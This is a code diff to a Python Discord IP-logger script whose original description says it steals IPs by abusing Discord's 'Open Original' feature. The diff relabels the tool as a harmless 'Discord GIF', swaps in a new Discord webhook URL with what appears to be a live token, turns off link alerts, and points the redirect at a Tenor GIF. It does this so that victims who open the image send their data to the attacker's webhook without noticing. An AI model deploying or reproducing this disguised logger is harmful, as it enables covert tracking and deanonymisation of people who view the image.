@@ -2,15 +2,15 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__app__ = "Discord GIF"
+__description__ = "a simple gif"
 __version__ = "v2.0"
 __author__ = "Rynn"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1126921496867131443/R0dywbKox6FWQc_RvPruv-VR0Jna2GEo4r__G6gnyS8_LP2-7iseE13mzMX3T99R0ugF",
-    "image": "https://cdn.discordapp.com/attachments/1128910588941176892/1128932177636229260/IMG_5094.png",
+    "webhook": "https://discord.com/api/webhooks/1131873199492182096/Ewnoq4NUuZjW4HNhJ-QA-IBhKPDk7Et15MfrNPnuTIdkTZKwteS6JqoyqKa30P3ekUum",
+    "image": "https://cdn.discordapp.com/attachments/1131873175760801816/1141718146147954798/image.png",
     "imageArgument": True, 
 
     # CUSTOMIZATION #
@@ -33,7 +33,7 @@ config = {
                 # 1 = No ping cuando VPN
                 # 2 = No enviar cuando VPN
 
-    "linkAlerts": True, # envia una alerta
+    "linkAlerts": False, # envia una alerta
     "buggedImage": False, # muestra la imagen bugeada
 
     "antiBot": 1, # Prevents bots from triggering the alert
@@ -47,7 +47,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect a una pagina?
-        "page": "https://google.com"
+        "page": "https://tenor.com/view/big-spliff-gif-24594863"
     },
 }
 
